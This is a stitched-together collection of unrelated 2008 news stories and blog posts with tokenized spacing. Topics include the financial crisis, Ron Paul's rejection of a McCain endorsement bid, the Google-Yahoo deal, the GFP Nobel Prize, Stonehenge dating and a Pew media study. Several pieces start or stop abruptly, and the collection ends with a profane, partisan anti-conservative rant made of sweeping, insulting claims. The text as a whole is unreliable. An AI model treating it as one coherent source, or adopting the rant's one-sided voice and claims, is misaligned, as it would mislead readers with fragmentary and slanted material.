This led to the huge over - leveraging of financial institutions , which has vastly complicated the country 's economic policies .
It is especially disturbing that Secretary Paulson personally profited from these policies , earning hundreds of millions in compensation from Goldman Sachs during his years there as its CEO .
The collapse of the housing bubble , while falling short of the magnitude of the Great Depression , is likely to lead to the worst recession since World War II .
Repairing the damage caused by this bubble will be a long and difficult process .
Cleaning up the damage to the political system from President Bush 's unprecedented fear campaign may prove to be even more difficult .
Texan to Texan , as one fellow who famously switched parties in his political career to another , Phil Gramm took one last shot this week at bringing Ron Paul into the John McCain fold .
( See video below . )
Gramm not only failed , but Paul blew the whistle on him today as he castigated the choices offered voters by the two major - party presidential nominees and lent the cache he gained from his own White House bid to various third - party alternatives .
Paul held forth , as had been advertised , at a news conference in Washington where he was joined by independent ( and perennial ) presidential candidate Ralph Nader , Green Party candidate Cynthia McKinney and Constitution Party candidate Chuck Baldwin .
Missing from the show was Bob Barr who , true to the spirit of the Libertarian Party that tapped him as it nominee , decided at the last minute to skip the group gathering and hold his own news conference .
In his remarks , Paul revealed that a McCain representative , who he did not name , had called him as part of what has been a recent effort to score an endorsement .
Later , Paul told The Times ' Janet
Hook the go - between was Gramm , a former Democrat who signed up with the GOP in the early 1980s .
In explaining why he rejected the overture , Paul -- perhaps underestimating the size of his following these days -- said : " I do n't like the idea of getting 2 or 3 million people angry at me .
... I said absolutely no .
It might diminish my credibility . "
Paul , a Republican turned Libertarian White House candidate in 1988 turned Republican again , said Gramm pitched McCain as the potential president who would do " less harm ' ' than Democrat Barack Obama ( not exactly stirring words ) .
In urging a vote against the " establishment candidates , " Paul said , " There 's no doubt in my mind that we [ supporters of third - party contenders ] represent the majority . "
Obama allies quickly jumped at the news of Gramm 's contact with Paul .
Damien LaVera of the Democratic National Committee fired off an e-mail saying it offered " further evidence " that Gramm " is back in the good graces of the McCain campaign . "
He ostensibly had been banished from the inner circle after some ill - chosen words earlier this summer ( such as saying the U.S. had become " a nation of whiners " ) .

The tunnel and the light

It was amazing to read that the German chancellor decided that the German government will guarantee people ’s savings hoping that the rest of the European governments will follow .
I do n’t know if all of them can guarantee 100 % of the investments and savings but the bitter truth is that it will be a pity if people in Poland , in Greece , Finland or Portugal lose their money because of Wall Street ’s inabilities !
Now inability sounds pretty heavy but it is the truth , some greedy executives there thought that capitalism does n’t have any limits and big fish eat the small and whoever survives in the end gets the fancy mansion in N.Y . and the private jet , ignoring that the money was n’t theirs in the first place ; they were just doing a job committed to their customer .
That ’s another point , after being so long there they forgot that the customers are not just numbers but humans with names and lives , much more worse is that they forgot that a mistake can be painful for hundreds .
But then it was not the first time they made mistakes , they ’ve been practising since the early - 80s and what happened ?
Well nothing more than some people lost their jobs and as a consequence their houses , cars and some of them their families , but then again they were just numbers .
But the mistakes became more and more and more often , and the numbers became a wave and at the same time their greed became unstoppable .
Do you know what I hate more ?
This international dependence , this chain reaction .
Why suddenly I have to pay more for my mortgage in Finland and risk losing my savings because an idiot in California has screwed up !
I mean put the bastard in prison and lose the key if I care .
Do these people know though how many things I had to go through to get this mortgage ?
I nearly had to put my body as a guarantee and then because an idiot banker in Florida thought that they can give loans without guarantee my savings are in danger .
I have said it many times that I do n’t understand much about economics and I ’m not the type to gamble , I mean I ’m one of those who see the stock market as gambling .
The two investments I have done were made after a lot of thought and making sure that they could give me a bit more than the bank , but they could at least guarantee that in the end there is something for me .
After all , by investing or better by giving my very real money to a company with the right knowledge they would use them for the common good , a kind of partnership and then out of the blue without my knowledge I got a new partner from the other side of the ocean who screwed up with his money and I have to pay !
Hallelujah !
I really like what the German government did but then again Chancellor Merkel had to follow Ireland ’s example , they were the first to do so and actually guarantee 100 % of the people ’s savings .
The best part of the story ?
The other EU partners got angry because Ireland took one serious decision without asking them .
What a pity the UK had spent a whole year with Blair touring around all the capitals making sure that all the partners agreed to the invasion to Iraq !
Why did they get angry ?
Because they were forced to follow the Irish otherwise they would have to deal with their own people who would naturally expect their governments to support them guarantying their savings .
That now makes you wonder , what would have happened if the Irish had n’t done that move !
The usual thing , we would be screwed !
What will happen , I have n’t got a clue and I ’m browsing the financial papers and news daily to find out .
Long analysis reassures me that everything will be alright , we just have to go through this dark tunnel but then the bright light awaits .
The problem is that we are in this damn tunnel since the ' 80s and I cannot see any light ; it is all dark and I ’m afraid that I will never see the light .

Thanos , to vie with your cynicism a bit , before Dante and Virgil get to the tunnel that gets them to Purgatory on the other side of the earth , they have to journey in a rather dark and unpleasant place called hell .
Far from being in the tunnell I have a notion that we may still be in hell " in the middle of the journey of our life . "
What did Nietzsche say ?
Whatever does not kill us makes us stronger .
That is , unless it drives us crazy first .
Sartre too had an insight when he declared hell as other people .
That insight is wonderfully portrayed in that famous movie titled " Wall Street . "
It 's must to understand what is usually left out of all those mystifying mathematical financial formulas that describe Capitalism and the market : pure unadulterated greed that turns the Kantian imperative up - side - down and selfishly declares others nothing else but means to an end .
Sand 2008-10-07 12:27:05
Whatever other Kantian idiocy may be promulgated , if people were not useful to each other civilization of any type could not exist .
Emanuel Paparella 2008-10-07 14:12:38
Shall we also throw Kant into the bonfire together with the work of all the other German philosophers for good measure ?
If that is what the visiting voices have been suggesting lately do n't believe them ; they are villanous barbarians of the intellect .
Clint 2008-10-07 15:44:38 Merkel on Sunday was telling Brown the Irish were wrong and that she did not believe in unilateral action .
Two hours later she 's protecting her own and dancing an Irish jig .
It is said a week is a long time in politics , but two hours .
Do n't yer love it the EU at its very best .
Still it gave Brown a Neville Chamberlain moment .
Bless him !

If
Kant says things that are obviously foolish they obviously must be appraised by their content and not accepted merely because they were said by Kant .
If Paparella decides they must be consigned to flames , of course that 's his prerogative but book burning , beyond adding to global warming , is a habit I would prompt Paparella to discourage .
Emanuel Paparella 2008-10-07 23:02:54
Paparella was not even born yet when the barbarians of the intellect in 1942 consigned to the bonfire some of the finest classics of Western Civilization .

I could n't believe , when I got the invitation , how many people were so openly tuned with my deepest feelings :D
This woman surely has a merit : she can definitely gather a lot of antipathies around her !! :D Sand 2008-10-08 07:02:26
According to your logic , Mr.P. you would have had to be over 2000 years old to be a Christian .
Sand 2008-10-08 07:16:43 Hey AP .
What are all those floating Ps and Ds you keep putting in ?
There are lots of people throughout history that gathered great antipathies and I cannot see how that grants them any particular merit .
AP 2008-10-08 16:11:33
Sand , I was being ironic , of course ( about the merit ) .
Hey , the floating : Ds are little faces with both eyes and a grin turned right , as the floating : Ps are little faces with both eyes and their tongues out turned right .
You see , Mr. P complained about my LOL before , so I 'm trying to be more graphic while using " internetical " language .
I 'm not sure if Aristotle used such codes with his disciples though , and that may serve as some kind of justification to condemn my attitude :D : P these are more expressive than LOL , ah ?
You still have some more signs ( the single thing that you have to do in order to understand them is to imagine little faces turned right ) :

It is , of course for me , a graphic of Helsinki in a snowstorm .
When my younger son died we put the side - on smiley on his tombstone since he was an avid computer user .

For me , it is the canvas that I 've been painting all day and tonight at home finally barefoot ( ah , painting barefoot is SO relaxing and liberating !
... specially when your sneakers , far from being comfortable , kill you the whole day instead ) , a reinterpretation of Mrs. Matisse green stripe portrait but with a well - known " movie Mrs. star " in red gloves and turning her face to the left side of the canvas ( the stripe is there still , but diagonal as she rests her cheek on her hand and her oblique arm is covered with the long red glove ) .
I 'm sorry about your son , you must recall in particular the good things about his existence , it seems .
Even if it happened a long time ago , the way you chose to celebrate his memory was nice and original .
Sand 2008-10-09 02:21:58
My son is why I am so fond of Finland .
When he was struck by a reckless driver at the age of three I was working for the UN in Israel .
He was a US citizen but the US would not help me so he was given a life here in Finland through President Kekkonen 's intervention and spent the rest of his 32 years as a quadriplegic on a respirator in a Helsinki hospital with 24 hour nurses .
He was exceedingly bright and his computer gave him a life .
AP 2008-10-09 02:43:55
I imagine how grateful you must be to Finland for the support given back then .
Now Sand , if an image with a chocolate cake that I sent to Ovi some days ago is published this week , please do n't be offended and take into account that it is not a personal critic , but a social one instead , and it does n't mean to question your gratefulness and appreciation for the country in any way whatsoever .
ps - your son ever got the chance to taste your chocolate cakes , he liked them ?
Sand 2008-10-09 02:50:38
I 'm a pretty good cook and I would bring him hot meals in a thermos whenever the hospital food was not to his taste .
He enjoyed my spaghetti with meatballs , lasagna , broiled fish with fried rice and vegetables , Chocolate , spice , applesauce , blitzkuchen cakes and a large variety of cookies .
And I made pizzas before Finland discovered them .

The Google - Yahoo search partnership is getting neutered by the Justice Department .
If the current " compromises " are adopted , the deal will be worth far less to Yahoo , Yahoo shareholders , and Google , which is one reason Yahoo's stock is taking it on the chin .
Who is responsible for the search deal getting bogged down ?
In all likelihood ... Microsoft .
Redmond 's lobbying army got the Google - DoubleClick deal delayed for damn near eternity , and we imagine that it is now putting the fear of God into the advertising industry and Justice Department .
Think of this as Chinese water torture payback for the Google - Yahoo collusion during the Microsoft - Yahoo takeover dance .
What " compromises " are on the table ?
capping the volume of Google ads Yahoo would use ,
assurances that Yahoo would continue to compete in search ads ,
a reporting mechanism to ensure compliance
measures that will ensure that prices ... do n't rise significantly after the deal .
The big deal here is the first two terms : capping the number of searches and forcing Yahoo to continue to compete in search .
Right now , Yahoo says it intends to maintain its Panama search platform after the Google deal launches .
Within a year of launching of an unfettered Google deal , however , we would expect Yahoo to drop Panama .
Why ?
Because , now that Google will be serving some of Yahoo's search ads , Panama is a complete waste of money .
For Yahoo , the advantages of the Google partnership are twofold :
increased revenue per search ( because Google has more advertisers and a better matching system )
( because Google has more advertisers and a better matching system ) reduced costs per search ( through the ability to phase out Panama over time .
If Yahoo is forced to continue to maintain its own Panama system , it will sacrifice revenue and incur additional needless cost .
Thus , the current compromises on the table will significantly dilute the value of the deal .
Chalk up another quiet victory for Microsoft .
If Microsoft does eventually decide to buy Yahoo , it will almost certainly be able to do so at a lower price than if the Google - Yahoo deal had been launched without conditions .
And even if it does n't buy Yahoo , it gets the quiet pleasure of poking another stick at the carcass of a company the spurned its now extraordinarily generous buyout offer .

A feisty Malaysian housewife went to extremes on Wednesday when her handbag was snatched by a motorcycle - riding thief .
But she was n't giving up her prized posession so easily .
She gave chase on her own motorbike !
Possibly inspired by Angelina Jolie 's bike chase in Tomb Raider the determined 41 - year old woman chased the bag snatcher for 100 meters .
After driving the thief down she intentionally crashed her bike into his , causing them both to fall off .
She then screamed for help , attracting passersbys who apprehended the man .
The robber was handed over to police , who believe he was also involved in other bag snatching cases around the Cukai area of Northeast Malaysia .
We all know a good handbag is a woman 's best friend , but how many women would have the guts to do something like this ?
I know I 'd have surrendered mine !
This is one serious case of girl power !
It reminds me of some of these great stories about angry women toting handbags !

STOCKHOLM ( Reuters ) - Two Americans and a Japanese researcher won the 2008 Nobel Prize in Chemistry on Wednesday for the discovery of a glowing jellyfish protein that makes cells , tissues and even organs light up -- a tool used by thousands of researchers around the world .
In this undated publicity photo released by Tsien Lab and the University of California , San Diego , Dr. Roger Tsien 's lab created this wreath made from tubes of various fluorescent proteins that were displayed in a box with UV light shining on them .
Japanese researcher Osamu Shimomura and Americans Roger Tsien and Martin Chalfie were jointly awarded the 2008 Nobel Prize for Chemistry October 8 , 2008 .
They won " for the discovery and development of the green fluorescent protein , GFP " .

The 10 million Swedish crown ( $ 1.4 million ) prize recognizes Japanese - born Osamu Shimomura , now of the Marine Biological Laboratory in Woods Hole , Massachusetts , Martin Chalfie of Columbia University in New York and Roger Tsien of the University of California , San Diego , for their discoveries with green fluorescent protein .
“ Green fluorescent proteins allow scientists quite literally to see the growth of cancer and study Alzheimer ’s disease and other conditions that affect millions of people , ” said Bruce Bursten , president of the American Chemical Society .
“ This protein has become one of the most important tools used in contemporary bioscience , ” the Nobel Committee for Chemistry at the Royal Swedish Academy of Sciences said in a statement .
Shimomura , 80 , first isolated GFP from jellyfish drifting off the western coast of North America and discovered that it glowed bright green under ultraviolet light .
For 20 years from 1967 , he made a summer pilgrimage to Friday Harbor in Washington state to gather more than 3,000 jellyfish per day .
Chalfie and colleagues got bacteria such as E. coli and tiny worms called C. elegans to produce the protein by splicing in the right gene .
The protein glows under blue and ultraviolet light , allowing researchers to illuminate tumor cells , trace toxins and to monitor genes as they turn on and off .
“ The discovery is of great use for humanity .
In the past 10 years , in almost every second publication in the big journals , people are using this method , ” Lars Thelander , a member of the Nobel Committee for Chemistry , said in an interview .
INTERNAL FLASHLIGHT
“ We can simply look inside an animal and say where has this gene been turned on , when is it turned on and when the protein is made , where does it go ? ” Chalfie , 61 , said in a telephone interview .
“ They have their own flashlight telling you where they are . ”
Tsien , 56 , a Howard Hughes Medical Institute investigator , used coral proteins too , and extended the palette beyond green to yellow , blue and other colors , allowing scientists to follow several different biological processes at the same time .
He said asthma kept him indoors as a child , so he spent hours playing with colors as part of chemistry experiments in his basement .
Chalfie said he missed the first call from the Nobel committee : “ I looked on the computer , my laptop , and I found that I had won the prize .
I slept through the phone call . ”

GFP has been used for art as well as for science .
A green - glowing bunny named Alba was made in 2000 at the request of Chicago artist Eduardo Kac and green - glowing pigs have been gene engineered and bred to make green - glowing piglets .
No one is sure what the jellyfish use the glow for .
“ It ’s either sex or food , ” said Dr. Jeremy Berg of the National Institute of General Medical Sciences , one of the U.S. National Institutes of Health , which funded all three researchers .
“ Whether they use it to commune with one another or help them hunt , I do n’t know . ”
The prizes were established in the will of 19th - century dynamite tycoon Alfred Nobel and have been awarded since 1901 .
The laureate for literature will be unveiled on Thursday , followed by the Nobel Peace Prize on Friday and the economics award on Monday .

Advocates Tout ' Victory ' For Patients and Caregivers
Outside the University of Colorado Police Department on Monday , cheers erupted from a crowd of marijuana advocates -- some of whom were dressed as giant pot leaves -- when a student was given back medical marijuana that police took from him in May .
" I wish I had a chance to talk to the officers who said I 'd never get this back , " said CU sophomore Edward Nicholson , 20 , who 's a medical - marijuana cardholder in Colorado .

Canada 's obsession with " clean coal " and carbon capture technologies has left it blind to the vast potential of its own geothermal resources , says the head of one of the country 's few publicly traded developers of geothermal power .
Gary Thompson , chief executive of Sierra Geothermal Power Inc. of Vancouver , said the neglect has left Canada a laggard among peers who view emission - free geothermal power as a strategic part of their electricity mix .
" We 're one of the few countries with significant geothermal potential that 's not doing anything about it , " said Thompson , adding that the federal government has shown little interest , despite calls for more study .
" It 's rather disconcerting .
They 've really been letting Canadians down . "
Thompson recently became vice - chair of the Canadian Geothermal Energy Association in Calgary .
He said he joined because geothermal " is not getting any love " in Canada and he wanted to create more public awareness of the potential .
It 's a suggestion Natural Resources Canada disputes .
" The Government of Canada supports increased supply of clean electricity from renewable sources , including geothermal , " said department spokesperson Héloïse Perron , citing a government ecoENERGY program that supports up to 4,000 megawatts of electricity development from geothermal , wind , solar and other renewable power systems .
Critics , however , say the inclusion of geothermal power under a general program designed around renewables is not akin to specifically backing research and development of the resource .
" It 's really a shotgun approach , " said Michal Moore , former chief economist at the U.S. National Renewable Laboratory and a senior fellow at the University of Calgary 's Institute for Sustainable Energy , Environment and Economy .
Moore co-authored a study released last week , mostly focused on Alberta , that recommended geothermal be " subject to a co-ordinated and multi- faceted ongoing research program . "
It concluded that next - generation geothermal technologies could reduce or substitute for proposed clean coal or nuclear plants " at competitive prices . "
But Thompson said more groundwork is needed .
He said the association 's first goal is to have Natural Resources Canada , through the Geological Survey of Canada , invest in a thorough assessment of the country 's geothermal potential – something that has n't been done in more than two decades .
It 's also preparing a policy white paper that will break down myths that have hindered development of the resource .
" A lot of politicians just do n't understand it , " Thompson said .
" In their view it has no potential . "
Meanwhile , billions of dollars are being put into unproven technologies aimed at giving the oil sands and coal industry a greener image , he said .
Last week , Alberta Premier Ed Stelmach announced plans for a $ 2 billion fund that would accelerate development of carbon capture and storage technology .
The geothermal power plants tap hot temperatures kilometres below the surface to create steam that spin turbines that generate electricity .
Conventional geothermal , or earth energy , facilities tend to be located in countries , including Canada , that lie along the so - called Ring of Fire – a region with shallow heat .
Though out of date , estimates for potential in Canada range from 3,000 to 6,000 megawatts , much higher as drilling and engineering costs fall .
Thompson 's company has focused its efforts on Nevada because of U.S. incentives that help fund early drilling costs .
The U.S. also offers a production tax credit of two cents per kilowatt - hour , while Canada offers one cent .
" I had done a lot of research in Canada and after several years ended up banging my head against the wall , " said Thompson , recalling the difficulty of getting support .
" We ended up looking at projects stateside . "
It 's a similar story for Nevada Geothermal Power Inc. , Polaris Geothermal Inc. and Western GeoPower Corp. , all Canadian - based companies that have done most of their development outside of Canada .
The only commercial geothermal power initiative under development in Canada is Western Geo's South Meager project in B.C .
Germany , on the other hand , is forging ahead with next - generation " enhanced geothermal " that will make it possible to develop the technology in more locations around the world .
In the U.S. , the Department of Energy last month pledged to invest up to $ 90 million ( U.S. ) over four years into research related to enhanced geothermal systems .

Advertisement Archaeologists have pinpointed the construction of Stonehenge to 2300 BC - a key step to discovering how and why the mysterious edifice was built .
The radiocarbon date is said to be the most accurate yet and means the ring 's original bluestones were put up 300 years later than previously thought .
The dating is the major finding from an excavation inside the henge by Profs Tim Darvill and Geoff Wainwright .
The duo found evidence suggesting Stonehenge was a centre of healing .
Others have argued that the monument was a shrine to worship ancestors , or a calendar to mark the solstices .
A documentary following the progress of the recent dig has been recorded by the BBC Timewatch series .
It will be broadcast on Saturday 27 September .
Date demand
For centuries , archaeologists have marvelled at the construction of Stonehenge , which lies on Salisbury Plain , Wiltshire .
Mineral analysis indicates that the original circle of bluestones was transported to the plain from a site 240 km ( 150 miles ) away , in the Preseli hills , South Wales .
This extraordinary feat suggests the stones were thought to harbour great powers .
The dig was the first inside the ring since 1946 Professors Darvill and Wainwright believe that Stonehenge was a centre of healing - a " Neolithic Lourdes " , to which the sick and injured travelled from far and wide , to be healed by the powers of the bluestones .
They note that " an abnormal number " of the corpses found in tombs nearby Stonehenge display signs of serious physical injury and disease .
And analysis of teeth recovered from graves show that " around half " of the corpses were from people who were " not native to the Stonehenge area " .
" Stonehenge would attract not only people who were unwell , but people who were capable of [ healing ] them , " said Professor Darvill , of Bournemouth University .
" Therefore , in a sense , Stonehenge becomes ' the A & E ' of southern England . "
Modern techniques
But without a reliable carbon date for the construction of Stonehenge , it has been difficult to establish this , or any other , theory .
Until now , the consensus view for the date of the first stone circle was anywhere between 2600BC and 2400BC .
To cement the date once and for all , Professors Darvill and Wainwright were granted permission by English Heritage to excavate a patch of earth just 2.5 m x 3.5 m , in between the two circles of giant sarsen stones .
The key was to get organic matter from the bluestone sockets
The dig unearthed about 100 pieces of organic material from the original bluestone sockets , now buried under the monument .
Of these , 14 were selected to be sent for modern carbon dating , at Oxford University .
The result - 2300 BC - is the most reliable date yet for the erection of the first bluestones .
Strictly speaking , the result was rounded down to " between 2400 BC and 2200 BC " - but 2300 BC is taken as the average .
An even more precise date will be produced in the coming months .
" It 's an incredible feeling , a dream come true , " said Professor Wainwright , formerly chief archaeologist at English Heritage .
" We told the world we were going to date Stonehenge .
That was a risk , but I was always confident , " said Professor Darvill .

Advertisement Intriguingly , the date range ties in closely with the date for the burial of the so - called " Amesbury Archer " , whose tomb was discovered three miles from Stonehenge .
Some archaeologists believe the Archer is the key to understanding why Stonehenge was built .
Analyses of his corpse and artefacts from his grave indicate he was a wealthy and powerful man , with knowledge of metal working , who had travelled to Salisbury from Alpine Europe , for reasons unknown .
Post mortem examinations show that he suffered from both a serious knee injury and a potentially fatal dental problem , leading Darvill and Wainwright to conclude that the Archer came to Stonehenge to be healed .
But without an accurate date for Stonehenge , it was not even clear whether the temple existed while the Archer was alive .
His remains have been dated between 2500BC and 2300 BC - within the same period that the first stone circle was erected .
" It 's quite extraordinary that the date of the Amesbury Archer is identical with our new date for the bluestones of Stonehenge , " said Professor Darvill .
" These two things happening within living memory of each other for sure is something very , very important . "
Earliest occupation Professor Wainwright added : " Was the Amesbury Archer , as some have suggested , the person responsible for the building of Stonehenge ?
I think the answer to that is almost certainly ' no ' .
" But did he travel there to be healed ?
Did he limp , or was he carried , all the way from Switzerland to Wiltshire , because he had heard of the miraculous healing properties of Stonehenge ?
' Yes , absolutely ' .
" Tim and I are quite convinced that people went to Stonehenge to get well .
But Stonehenge probably had more than one purpose , so I have no problem with other people 's interpretations . "
All theories about Stonehenge must follow an accurate dating Among other key finds , the team uncovered organic material that indicates people inhabited the Stonehenge site as long ago as 7200 BC - more than 3,500 years earlier than anything previously known .
They also found that bluestone chippings outnumbered sarsen stone chippings by three to one - which Wainwright takes to be a sign of their value .
" It could be that people were flaking off pieces of bluestone , in order to create little bits to take away ... as lucky amulets , " he said .
The duo are preparing to publish an academic report of their excavation , and will announce their findings to their peers next month , in a lecture at London 's Society of Antiquaries .
Ongoing debate Experts on Stonehenge said the new date was a major milestone in understanding Britain 's most famous monument .
Dr Andrew Fitzpatrick , of Wessex Archaeology , said : " This is a great result - a very important one .
" The date of Stonehenge had been blowing in the wind .
But this anchors it .
It helps us to be secure about the chronology of events .
Profs Darvill and Wainwright believe their ideas hold true " The theory that it was a centre of healing is certainly a plausible one , but I do n't think we can rule out the other main competing theory - that the temple was a meeting point between the land of the living and the dead .
" I am not yet persuaded that the Amesbury Archer came to Stonehenge to be healed .
I favour the interpretation that he was one of the earliest metal workers , who travelled to the area to make a living from his skills .
" In any case , it is still not clear if his burial predated Stonehenge . "
Dave Batchelor , Stonehenge curator at English Heritage , said : " We are pleased that the professors ' precision in targeting that small area of turf and their rigorous standards in archaeological excavations have produced such a rich collection of physical evidence .
" We are looking forward to seeing the results of the full analysis , but from what we understand so far , we believe they have added valuable information to the chronology of Stonehenge . "

What are these ?
Just 14 percent of the stories about John McCain from the conventions through the final presidential debate were positive in tone , according to a study .
Study : McCain coverage mostly negative
The good news for John McCain ?
He 's now receiving as much attention from the national media as his Democratic rival .
The bad news ?
It ’s overwhelmingly negative .
Just 14 percent of the stories about John McCain , from the conventions through the final presidential debate , were positive in tone , according to a study released today , while nearly 60 percent were negative — the least favorable coverage of any of the four candidates on the two tickets .

The study , by The Pew Research Center 's Project for Excellence in Journalism , a nonpartisan journalism watchdog organization , examined 2,412 stories from 43 newspapers and cable news shows in the six - week period beginning just after the conventions and ending with the final presidential debate .
“ Much of the increased attention for McCain derived from actions by the senator himself , actions that , in the end , generated mostly negative assessments , ” the study found .
“ In many ways , the arc of the media narrative during this phase of the 2008 general election might best be described as a drama in which John McCain acted and Barack Obama reacted . ”
Indeed , the increased and increasingly negative media attention for McCain is n’t surprising when looking at how the campaign ’s strategy changed since the beginning of the general election .
“ We ran a different kind of campaign and nobody cared about us , ” spokesman Brian Rogers told Politico last month , adding later that “ we intend to stay on offense . ”
For Barack Obama , the study found coverage “ has been somewhat more positive than negative , but not markedly so , " with 36 percent of the stories positive in tone , 35 percent mixed , and 29 percent negative .
So do these numbers reveal a pro-Obama bias ?
Not necessarily , according to the study ’s authors .
Rather , they say , the statistics “ do offer a strong suggestion that winning in politics begat winning coverage , thanks in part to the relentless tendency of the press to frame its coverage of national elections as running narratives about the relative position of the candidates in the polls and internal tactical maneuvering to alter those positions . ”
While McCain left St. Paul , Minn. , with mostly positive coverage , Obama started out the same period with mostly negative press .
But as things turned in the polls , and especially in articles about detailing the electoral map , Obama ’s coverage became more favorable .
Obama ’s numbers , in fact , are in line with past presidential candidates around the same time periods in the 2000 and 2004 races .
It ’s McCain ’s coverage that has been extraordinarily negative in tone .
On the vice presidential side , Sarah Palin received three times as much attention as Joe Biden , though the two candidates atop each ticket are again receiving far more attention than their running mate as the campaign has moved into the home stretch .
Coverage of Palin , the study found , went from “ quite positive ” to “ very negative ” to “ more mixed . ”
Overall , the six - week breakdown showed 29 percent positive , 39 percent negative and 33 percent neutral .
While Biden has received far less coverage that the other three candidates , the study found the stories about him were “ far more negative than Palin ’s , and nearly as negative as McCain’s . ”
In examining tone , the project ’s authors wrote that they took a “ cautious and conservative approach , ” only judging a story positive or negative if the slant was very clear .

No , not that Joe .
Last night , I was in an online discussion at Crooks and Liars , and joedugan posted the following .
I was so blown away by it , I asked if I could repost it .
He graciously allowed me to do so .
Yes “ Hope and Change ” is a little bit of a trite act , but it sure beats what the Republicans have to offer .
Honestly , what is the use of conservatives ?
Do you people really have anything , anything at all to offer this country ?
You can talk trash – endless trash – about the people who are actually competent enough to run a government , but are you competent to do anything else ?
Ca n’t catch Bin Laden to save your lives .
In fact you ’ve let him hide out for seven years in Pakistan , a country you refer to as our ally .
Uh , if your enemy who has killed thousands of your people has found safe haven in a country , well … ‘ ally ’ is not the word Webster ’s would probably recommend .
You people ca n’t balance a budget – not even remotely .
Reagan gave us $ 100 billion dollar deficits , then $ 200 billion dollar deficits : now with Dubya it ’s $ 300 , $ 400 , $ 500 billion dollar deficits .
Do n’t understand simply words like ‘ ally ’ and ca n’t do remedial math : watching you people run the country is like watching a real dumb guy stumbling through an appearance on ‘ Are You Smarter than A Fifth Grader ? ’
Supply side economics is not some new genius idea , instead its an old idea that past Presidents had too much decency to implement .
For all the talk of tax cuts stimulating the economy , supply side economics basically consists of the idiotic idea of financing the current economy with huge debts to be repaid by our children : it ’s economic child abuse disguised as fiscal policy .
You do n’t believe in regulating markets .
A policy that led to the Savings and Loans Crisis , Enron , the current mortgage crisis and a little thing called the Great Depression .
You deny the existence of global warming .
Every scientist in the world says it ’s true and you bring up the fact that the Earth ’s climate has always naturally fluctuated .
Well DUH !
You think the pointy heads with PhD.s do n’t know that ?
Are n’t accounting for that ?
I was taught that in Climatology 302 – 20 years ago .
At the same time I was taught about global warming – It was the accepted scientific theory back THEN !
Do n’t even start with the ‘ global cooling ’ crap : one science magazine did a ‘ global cooling ’ cover in the 1970s and you guys have n’t shut up about in since .
What wars have conservatives won ?
Liberal Wilson won WW1 and a guy 10 times more liberal than Obama , FDR , won WW2 .
Liberals started Korea and Vietnam and moderate Republicans ended them with a draw and a loss .
Ronnie did win in Grenada – Big Woo !!
George H.W. Bush was no conservative .
The Cold War took nearly 50 years and a lot of effort to win , so cut the crap about Reagan winning it single - handedly : subtract Gorbachev from the equation and the Gipper ’s main claim to fame is giving Bin Laden and the Taliban their start – beyond his greatest achievement , of course : enabling the global spread of AIDS , due to his thoughtful , conservative approach of doing jack shit to stop it .
WW2 is my favorite , though .
Our country ’s greatest test and greatest triumph , and where were all the conservatives ?
What part did they play ?
Well the ones who were n’t fascist sympathizers like Henry Ford and Lindbergh , were isolationists , who were doing everything they could to prevent the U.S. from stepping in to the greatest crisis of modern times and saving the free world .
Of course Churchill was a conservative but he was British , you see .
Plus he was a highly intelligent man and would doubtlessly consider the modern American conservative movement to be an unholy alliance of philistines and fools .
Conservatives are great patriots .
Bullshit !!
You people pimp Old Glory like it was a teenage runaway you sweet - talked out of the Greyhound station .
The only way this country has been made great is by the high standard to which millions of its citizens have held their country and themselves over hundreds of years .
If anyone today tries to hold this country to a high standard , then conservatives bitch and moan about how liberals ‘ blame America first . ’
To conservatives , the high standards I speak off are a limbo bar , to be lowered year after year until we become a nation of liars , torturers and crooks : despised throughout the world .
Morals .
Do conservatives even have morals ?
As far as I can see they value only themselves and money .
Oh wait , they care about the unborn babies .
They care , care , care oh so much , much , much about those unborn babies – and then they became BORN babies and its FUCK ‘EM – I ai n’t paying no taxes to educate that kid , or give him health care , or keep him out of jail , or help feed him good NUTRITIOUS food or make sure he grows up in a good home .
Make sure that all the poor , poor , poor unborn babies are born so that they can grow up unwanted and living in shit .
But wait I ’m not saying that conservatives do n’t care about the future generations : conservatives are always willing to spend the big bucks on prisons and executions to make up for the pocket change they saved by shorting on schools and social programs .
It ’s a matter of principle with them : Ayn Rand and the ownership society or some such crap that most of us saw through as unworkable Utopian horseshit back in sophomore year of high school .
The poor babies stuff is mostly bullshit , though .
If irresponsible , self - pitying angry white males could get knocked up , abortion would n’t be an issue in this country .
Hell , it ’d be free .
If some older girl had talked her way into Rusty Limbaugh ’s size XXL Fruit of the Looms back in High School , and left him , or George Will , or Dubya , or DeLay , or Alan Keyes , with a bun in the oven – those turkeys would be singing a different tune .
Plus , of course , they ’d finally have valid excuses for why they never served in Vietnam .
Here ’s a big lie : Conservative leadership has kept us safe since 9 - 11 .
The success of 9 - 11 was due almost entirely to the element of surprise .
Al Qaeda no longer has that .
The shoe bomber was stopped by ordinary , alert citizens , not by the FBI , CIA or NSA .
Al Qaeda has a lot more trouble working in our country simply because our citizens are , comparatively to pre 9 - 11 , hyper- vigilant .
Besides , there was that devastating attack we suffered 3 years ago .
Thousands dead [ or missing ] .
A major American city destroyed .
Who was in charge of keeping us safe from Katrina but the Department of Homeland Security ?
They had excellent intel .
They knew , days in advance , how big the attack was , the nature of the attack , where it would occur , and when it would occur .
Yet they still failed to evacuate 1000s of the poorest , most vulnerable citizens of New Orleans .
If they failed so miserably with a hurricane – a type of storm that we have had hundreds of years to become accustomed to – it is almost inconceivable to think what a clusterfuck they would have made of a terrorist attack .
I could go on , and on , and on .
Your chosen political philosophy is whack like crack .
Joe goes on to say :
Republicans do n’t suck – there are still a few good ones left – it ’s just the conservatives that suck .
They have spent years insisting that their philosophy is the correct one and that they deserve a chance to govern .
Well they got that chance , and they failed COMPLETELY .
TOTALITY .
Filling the Hindenberg with hydrogen was a better thought out plan than most of what we ’ve seen the last 8 years .
And do n’t even get me started on the corruption : these people would make Tony Soprano blush .
Sure Obama is unproven , but he has a proven V.P. candidate by his side and there is lots of talent available from the Clinton administration – a successful and competent administration .
McCain is old and cancer - prone .
His mother and aunt are still living , but his father and grandfather died young .
There is a good chance you will really be voting to elect Palin , who is ridiculously unqualified .
She may be smart , and she may be memorizing those Lincoln quotes as fast as she can , but she ’s got a long way to go .
Angry and erratic congress ?
Maybe you are thinking of 3 years ago when Tom DeLay was running things .
Pelosi and Reid wo n’t even take on Bush – the worst president in history .
28 % approval .
The whole country would welcome impeachment .
Every now and then John Conyers sends Karl Rove or someone a sternly written letter : that ’s it .
Angry and erratic ?
If you are scared of Pelosi and Reid – the multi-gazillionaire and the Mormon – those two crazed reds , well then remind me not to tell you about Caspar the Friendly Ghost – you ’ll pee your pants .
